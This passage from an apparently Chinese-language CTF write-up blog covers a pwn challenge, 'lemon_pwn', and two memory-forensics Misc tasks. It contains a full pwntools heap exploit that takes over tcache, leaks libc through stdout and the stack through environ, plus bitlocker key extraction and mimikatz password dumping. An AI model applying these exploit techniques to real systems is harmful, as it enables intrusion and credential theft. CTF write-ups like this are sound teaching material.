因为只能用一次所以想控制整个tcache结构</p><p>其它一点可利用的函数:</p><p>开头的一次welcome:</p><p>虽然是有rand, 但无随机数种子, 所以是固定值, z3一把🔒!</p><p>eat函数: 可以打印chunkaddr第四字节, 用于配合后面分配堆块</p><p>整体思路: 利用color控制lemon_addr指向tcache的地址, 然后用一次释放一次可以做到一直控制tcache, 第一次使用可以设置tcache某些块数量达到7, 从而生成unsortedbin, 虽然无法直接打印, 但是使用particular write+爆破可以让chunk申请到_IO_2_1_stdout中, 然后泄露libc, 之后再以类似操作用environ打印出栈基址, 配合之前的泄露获取stack地址, 最后再用io即可打印出flag</p><p>难点:</p><p>多了个类似ptmalloc的检测在分配完成之后, 导致使用free_hook等充满难度:</p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./lemon_pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc/libc-2.26.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token operator">=</span>BitVec<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">)</span>    x<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span>x<span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>x<span class="token operator">-</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>x<span class="token operator">/</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token operator">=</span>Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token number">0x6b8b4567</span><span class="token operator">==</span><span class="token number">0x13b6db38</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>    result<span class="token operator">=</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> result<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">,</span>length<span class="token punctuation">,</span>context<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon: \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'name your lemon: \n'</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'length of message for you lemon: \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> length <span class="token operator">&lt;=</span> <span class="token number">0x400</span><span class="token punctuation">:</span>        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'message: \n'</span><span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">throw</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">color</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon  : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'draw and color!\n'</span><span class="token punctuation">,</span>context<span class="token punctuation">)</span>       <span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'me?\n'</span><span class="token punctuation">,</span><span class="token string">'yes'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' number: \n'</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x4a46bd98</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'first: \n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>            add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wwww\n'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wwww\n'</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token comment">#add(3,'a\n',944,'a\n')</span>    <span class="token comment">#add(3,'a\n',16,'a\n')</span>    eat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'eat eat eat '</span><span class="token punctuation">)</span>    addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>addr<span class="token operator">-</span><span class="token number">0x250</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">''' control all tc'''</span>    throw<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x37</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">0xd0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a\n'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0x86ed</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''boom!'''</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a\n'</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">'\x88'</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io)</span>    stdin<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> stdin<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>    stdout <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    environ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_environ'</span><span class="token punctuation">]</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io, '''b *$rebase(0x1106)''')</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>environ<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    stack<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x180</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment">#io=process('./lemon_pwn')</span>    <span class="token comment">#io = remote('47.104.70.90',34524)</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">except</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="层层取证"><a href="#层层取证" class="headerlink" title="层层取证"></a>层层取证</h3><p>volatility 内存取证，使用 bitlocker 插件可得如下内容。</p><pre class="language-plain" data-language="plain"><code class="language-plain">Volatility Foundation Volatility Framework 2.6.1Address : 0xfa800d12e7e0Cipher  : AES-128FVEK    : 0ff9192acdbf1df3c6dc36fb58cf76ceTWEAK   : b423bd84872ff72b583bb9bdee1762ac</code></pre><p>使用 bdemount 可解密 bitlocker 磁盘分区，然后使用 mount 挂载，可以得到一个2.pcapng。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> bdemount <span class="token parameter variable">-k</span> 0ff9192acdbf1df3c6dc36fb58cf76ce:b423bd84872ff72b583bb9bdee1762ac ext.dd /mnt/mount1</code></pre><p>使用 mimikatz 插件可以得到下列内容。</p><pre class="language-plain" data-language="plain"><code class="language-plain">Volatility Foundation Volatility Framework 2.6.1Module   User             Domain           Password-------- ---------------- ---------------- ----------------------------------------wdigest  XiaoMing         PC               xiaoming_handsomewdigest  PC$              WORKGROUP</code></pre><p>使用 FTK Imager 加载磁盘后在 XiaoMing 用户的桌面发现了 flag.txt 提示需要仿真。使用 VMware 加载 FTK Imager 挂载的物理磁盘新建虚拟机，使用 Oracle Virtual Box 启动虚拟机来仿真。</p><img src="/article/2021xyb/c09803d05f1e71c6e555bb1190c5fc8.jpg" class="" title="c09803d05f1e71c6e555bb1190c5fc8" loading="lazy"><p>对流量包使用 WireShark 分析，UDP 流 32 处有压缩包。</p><img src="/article/2021xyb/image-0655563.png" class="" title="image" loading="lazy"><p>将其提取出来后在注释中可发现提示，其解压密码与电脑登录密码一致。解压后得到 Word 文档，使用上述便签上的密码解密即可得到 flag。</p><h3 id="考古"><a href="#考古" class="headerlink" title="考古"></a>考古</h3><p>本题我们拿了一血，可惜<small>啧啧 发生了一些事情</small></p><p>使用 volatility 对内存镜像进行分析，在用户的桌面可以发现一个可疑的 exe 文件，将其提取出来。使用如下脚本解出来 data。</p><pre class="language-plain" data-language="plain"><code class="language-plain">#include&lt;stdio.h>#include&lt;stdlib.h>int main()&#123;  FILE *v4; // [esp+10h] [ebp-14h]  int k; // [esp+14h] [ebp-10h]  signed int j; // [esp+18h] [ebp-Ch]  int i; // [esp+1Ch] [ebp-8h]  char *key = "this_a_key";  unsigned char data[] =&#123;  164, 167, 120, 147, 254, 208,  69, 138, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  97,  97,  92, 107, 155, 134,   125, 104, 111, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  94,  97,  95, 107, 110, 121,   116, 104, 105, 115,  95,  97,  95, 123, 101, 121,   122, 104, 105, 115,  94,  97,  95, 107, 155, 134,   139, 151, 105, 115,  95,  97,  83, 107, 101, 121,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151,  59, 115,  48,  97,  48, 107,  17, 121,    84, 104,  44, 115,  49,  97,  43, 107,  23, 121,    13, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  73, 107,  96, 121,   139, 151, 150, 140, 160, 158, 160, 148, 102, 121,   116, 104, 105, 122,  93,  97,  95, 107, 101, 121,   180, 104, 105, 115,  95,  97,  95,  45, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   132, 132,  14, 203, 176,  27, 136, 106,  96, 121,   116, 104, 233, 127,  95,  97,  95, 107, 101, 121,   117, 104,  42, 115,  48,  97,  50, 107,  21, 121,    59, 104,  11, 115,  53,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  77,  97,  93, 106, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    26, 104, 105, 115,  95,  97,  95, 107,  50, 121,    27, 104,  27, 115,  59,  97,  27, 107,  10, 121,    23, 104,  28, 115,  50,  97,  58, 107,  11, 121,     0, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 115, 115,  93,  96, 160, 148, 154, 134,   112, 104, 105, 115, 160, 158, 160, 148, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  93,  97,  95, 107,  55, 115,   116, 104, 105, 115,  95,  97,  16, 107,   7, 121,    30, 104,  12, 115,  60,  97,  43, 107,  53, 121,    27, 104,   6, 115,  51,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    98, 104, 104, 114,  94,  97,  95, 107, 103, 121,   116, 104, 150, 140, 160, 158,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 127, 171, 175, 213,   155,  18, 190, 114, 127, 161, 149, 199, 138,   3,   163, 105, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  93,  97,  95, 107, 152, 134,   139, 151, 151, 140, 160, 158, 161, 148, 154, 134,   115, 104, 105, 115,  89,  97,  95, 107,  97, 121,   116, 104,  97, 115,  95,  97,  86, 107, 101, 121,   126, 104, 105, 115, 161, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158,  90, 107,  54, 121,     1, 104,   4, 115,  50,  97,  62, 107,  23, 121,    13, 104,  32, 115,  49,  97,  57, 107,  10, 121,     6, 104,   4, 115,  62,  97,  43, 107,  12, 121,    27, 104,   7, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    92, 104, 107, 115, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 121, 115,  95,  97,  25, 106, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 